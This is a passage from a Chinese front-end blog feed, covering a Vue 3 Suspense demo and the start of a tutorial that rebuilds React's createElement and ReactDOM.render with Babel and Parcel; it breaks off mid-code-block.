class=&quot;async-show&quot;&gt;</span><br><span class="line">    &lt;h2&gt;Result: &#123;&#123; result &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;img :src=&quot;result &amp;&amp; result.imgurl&quot; alt=&quot;&quot; width=&quot;600&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; defineComponent &#125; from &quot;vue&quot;;</span><br><span class="line">import axios from &quot;axios&quot;;</span><br><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &quot;AsyncShow&quot;,</span><br><span class="line">  async setup() &#123;</span><br><span class="line">    const rawData = await axios.get(&quot;/api/api.php?return=json&quot;);</span><br><span class="line">    return &#123;</span><br><span class="line">      result: rawData.data,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// index.vue</span><br><span class="line">// 引入 AsyncShow.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;Demo06&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Demo06&lt;/h1&gt;</span><br><span class="line">    &lt;Suspense&gt;</span><br><span class="line">      &lt;template #default&gt;</span><br><span class="line">        &lt;AsyncShow /&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">      &lt;template #fallback&gt;</span><br><span class="line">        &lt;h2&gt;Loading... ...&lt;/h2&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Suspense&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>如果异步组件加载失败，可以使用 <code>onErrorCaptured</code> 来捕获：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// index.vue</span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; onErrorCaptured &#125; from &quot;vue&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">  // ... ...</span><br><span class="line">  setup() &#123;</span><br><span class="line">    onErrorCaptured(error =&gt; &#123;</span><br><span class="line">      // 捕获异常</span><br><span class="line">      console.log(error);</span><br><span class="line">      return true;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图文并茂,React组件更新与渲染及Diff算法解析</title>
      <link href="/2021/05/6b293d86ef03.html"/>
      <url>/2021/05/6b293d86ef03.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Parcel-安装与使用"><a href="#1-Parcel-安装与使用" class="headerlink" title="1. Parcel 安装与使用"></a>1. Parcel 安装与使用</h1><p>Parcel 是 Web 应用打包工具，适用于经验不同的开发者。它利用多核处理提供了极快的速度，并且不需要任何配置。</p><blockquote><p>文档：<a href="https://www.parceljs.cn/getting_started.html">https://www.parceljs.cn/getting_started.html</a></p></blockquote><p>本地安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add parcel-bundler --dev</span><br></pre></td></tr></table></figure><p>安装 babel ，将 jsx 语法转化成 js 对象（虚拟DDM）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add @babel/core @babel/plugin-transform-react-jsx @babel/preset-env --dev</span><br></pre></td></tr></table></figure><p>配置 .babelrc ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;evn&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;transform-react-jsx&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prama&quot;</span><span class="punctuation">:</span> <span class="string">&quot;React.createElement&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="2-JSX-的渲染"><a href="#2-JSX-的渲染" class="headerlink" title="2. JSX 的渲染"></a>2. JSX 的渲染</h1><h2 id="2-1-Babel-转义"><a href="#2-1-Babel-转义" class="headerlink" title="2.1 Babel 转义"></a>2.1 Babel 转义</h2><p>先举个例子，当我们编写一个正常的 jsx 文件时，其结构是这样的：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;./lib/react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&quot;./lib/react-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ele = (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;active&quot;</span> <span class="attr">title</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    hello,<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &quot;<span class="attr">red</span>&quot; &#125;&#125;&gt;</span>React!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(ele, <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#app&quot;</span>));</span><br></pre></td></tr></table></figure><p>其中， babel 会对 jsx 部分进行转义，调用 react 的 <code>createElement</code> 方法去创建虚拟 DOM 树：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> flag = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">&quot;ZhangSan&quot;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;active&quot;</span> <span class="attr">title</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    hello<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &quot;<span class="attr">red</span>&quot; &#125;&#125;&gt;</span>React!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    my name is &#123;flag === true ? name : &quot;LiSi&quot;&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Babel 转义后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">&quot;ZhangSan&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="comment">/*#__PURE__*/</span><span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">className</span>: <span class="string">&quot;active&quot;</span>,</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">  &#125;, <span class="string">&quot;hello&quot;</span>, <span class="comment">/*#__PURE__*/</span><span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">style</span>: &#123;</span><br><span class="line">      <span class="attr">color</span>: <span class="string">&quot;red&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="string">&quot;React!&quot;</span>), <span class="string">&quot;my name is &quot;</span>, flag === <span class="literal">true</span> ? name : <span class="string">&quot;LiSi&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 Babel 进行对 jsx 语法的转义过程中，也会对模板语法直接进行转义，调用其中使用的变量</p></blockquote><p>同样的，我们可以不编写 JSX，直接调用 <code>React.createElement()</code> 方法来生成虚拟 DOM 树，然后再调用 <code>ReactDOM.render()</code> 来渲染虚拟 DOM 树：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;./lib/react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&quot;./lib/react-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ele = <span class="title class_">React</span>.<span class="title function_">createElement</span>(</span><br><span class="line">  <span class="string">&quot;div&quot;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">className</span>: <span class="string">&quot;active&quot;</span>,</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;hello,&quot;</span>,</span><br><span class="line">  <span class="title class_">React</span>.<span class="title function_">createElement</span>(</span><br><span class="line">    <span class="string">&quot;span&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">style</span>: &#123;</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&quot;red&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;React!&quot;</span></span><br><span class="line">  )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(ele, <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#app&quot;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>在 Babel 转义后由于会转义为 <code>React.createElement</code> 因此必须把 <code>React</code> 引入到当前代码中，这也就是为什么我们即使在代码中并没有用到 <code>React</code> 对象，却仍要引用它的原因。</p></blockquote><h2 id="2-2-React-createElement"><a href="#2-2-React-createElement" class="headerlink" title="2.2 React.createElement"></a>2.2 React.createElement</h2><p><code>React.createElement</code> 方法会生成一个对象，这个对象包含了将来生成节点的类型、属性、内容（包含子节点），其是一个嵌套的结构，这就形成了一个树形结构，我们便将其称之为 <strong>虚拟DOM树</strong>。</p><p>我们先来看下其 API 设计:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">React</span>.<span class="title function_">createElement</span>(tagName, attribute, ...children)</span><br></pre></td></tr></table></figure><p>tag 表示虚拟节点的类型，attribute 表示虚拟节点的属性，children 表示虚拟节点的子节点。这里要注意的是，如果子节点是文本节点，那么会直接传入一个字符串，如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;标题&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>会被 Babel 转化为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;标题&quot;</span>)</span><br></pre></td></tr></table></figure><p>实现这个方法其实也很简单，我们只需要返回一个对象就可以了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">React</span> = &#123;</span><br><span class="line">  createElement,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createElement</span>(<span class="params">tag, attrs, ...children</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    tag,</span><br><span class="line">    attrs,</span><br><span class="line">    children,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">React</span>;</span><br></pre></td></tr></table></figure><p>借用最初的例子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dom = (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;active&quot;</span> <span class="attr">title</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    hello,<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &quot;<span class="attr">red</span>&quot; &#125;&#125;&gt;</span>React!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>经 Babel 转义并使用调用 React.createElement() 后，打印出 dom：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;tag&quot;</span>: <span class="string">&quot;div&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attrs&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;className&quot;</span>: <span class="string">&quot;active&quot;</span>,</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;children&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;hello,&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;tag&quot;</span>: <span class="string">&quot;span&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attrs&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;style&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;color&quot;</span>: <span class="string">&quot;red&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;children&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;React!&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-ReactDOM-render"><a href="#2-3-ReactDOM-render" class="headerlink" title="2.3 ReactDOM.render"></a>2.3 ReactDOM.render</h2><p>React 生成了虚拟 DOM 树，那么 ReactDOM 就需要将虚拟 DOM 树渲染为 html 节点，其核心就是调用 <code>ReactDOM.render</code> 函数。</p><p>我们先来看一下 <code>ReactDOM.render</code> 函数的 API：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(vnode, container);</span><br></pre></td></tr></table></figure><p>其中，vnode 就是虚拟 DOM 树，container 就是由虚拟 DOM 树生成真实 html 节点后，节点挂载的目标父节点，其是一个 HTMLElement。</p><p>其实现也并不复杂，只需分如下几步：</p><ol><li>判断 vnode 类型，如果是字符串，就创建文本节点，并将文本节点挂载到目标父节点中；</li><li>如果不是字符串，那就根据 tag 名称，调用 <code>document.createElement</code> 生成真实节点；</li><li>为真实节点添加属性；</li><li>使用递归，遍历子节点，将当前生成的真实节点作为子节点的目标父节点，调用 render 函数渲染子节点；</li><li>调用 <code>appendChild</code> 方法将生成的节点挂载到目标父节点中。</li></ol><p>代码实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ReactDOM</span> = &#123; render &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">vnode, container</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (vnode === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 vnode 是字符串</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 创建文本节点</span></span><br><span class="line">    <span class="keyword">const</span> textNode = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(vnode);</span><br><span class="line">    <span class="keyword">return</span> container.<span class="title function_">appendChild</span>(textNode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则就是一个虚拟 DOM 对象</span></span><br><span class="line">  <span class="keyword">const</span> &#123; tag, attrs, children &#125; = vnode;</span><br><span class="line">  <span class="keyword">const</span> dom = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(tag);</span><br><span class="line">  <span class="keyword">if</span> (attrs) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> attrs) &#123;</span><br><span class="line">      <span class="keyword">const</span> value = attrs[key];</span><br><span class="line">      <span class="title function_">setAttribute</span>(dom, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 渲染子节点</span></span><br><span class="line">  <span class="keyword">if</span> (children &amp;&amp; children <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">    children.<span class="title function_">forEach</span>(<span class="function">(<span class="params">child</span>) =&gt;</span> <span class="title function_">render</span>(child, dom));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> container.<span class="title function_">appendChild</span>(dom);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setAttribute</span>(<span class="params">dom, key, value</span>) &#123;</span><br><span class="line">  <span class="comment">// 将属性名 className 转化为 class</span></span><br><span class="line">  <span class="keyword">if</span> (key === <span class="string">&quot;className&quot;</span>) &#123;</span><br><span class="line">    key = <span class="string">&quot;class&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是事件</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/on\w+/</span>.<span class="title function_">test</span>(key)) &#123;</span><br><span class="line">    key = key.<span class="title function_">toLowerCase</span>();</span><br><span class="line">    dom[key] = value || <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果是样式</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (key === <span class="string">&quot;style&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 样式是字符串</span></span><br><span class="line">    <span class="keyword">if</span> (!value || <span class="keyword">typeof</span> value === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">      dom.<span class="property">style</span>.<span class="property">cssText</span> = value || <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 样式是对象</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (value &amp;&amp; <span class="keyword">typeof</span> value === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">          dom.<span class="property">style</span>[key] = value[key] + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          dom.<span class="property">style</span>[key] = value[key];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 其他属性直接赋值</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key <span class="keyword">in</span> dom) &#123;</span><br><span class="line">      dom[key] = value || <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (value) &#123;</span><br><span class="line">      dom.<span class="title function_">setAttribute</span>(key, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      dom.<span class="title function_">removeAttribute</span>(key);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">ReactDOM</span>;</span><br></pre></td></tr></table></figure><h1 id="3-组件的实现"><a href="#3-组件的实现" class="headerlink" title="3. 组件的实现"></a>3. 组件的实现</h1><p>在上一节中，我们实现了 render 函数，render 函数的第一个参数可以传入一个虚拟节点。但是，在实际的 React 中，第一个参数还可以传入一个函数组件，因此我们以此为切入点，探讨一下 React 中组件的渲染原理。</p><h2 id="3-1-让-render-函数支持传入组件"><a href="#3-1-让-render-函数支持传入组件" class="headerlink" title="3.1 让 render 函数支持传入组件"></a>3.1 让 render 函数支持传入组件</h2><p>我们先来看一下经过 babel 转义的组件 jsx 长什么样子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;active&quot;</span> <span class="attr">title</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      hello, <span class="tag">&lt;<span class="name">span</span>&gt;</span>react<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> title = <span class="string">&quot;active&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Home</span> <span class="attr">name</span>=<span class="string">&#123;title&#125;</span> /&gt;</span></span>);</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://i.loli.net/2021/04/11/cvX3gjTHPVD1OBI.png" alt=""></p><p>我们可以发现，函数组件被处理为虚拟节点对象后，tag 中包含了改组件的渲染函数，因此我们可以通过 render 函数来判断 tag 属性来判断渲染对象到底是 HTMLElement 还是 React 组件，同时我们将 render 函数进行一下简单的拆分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 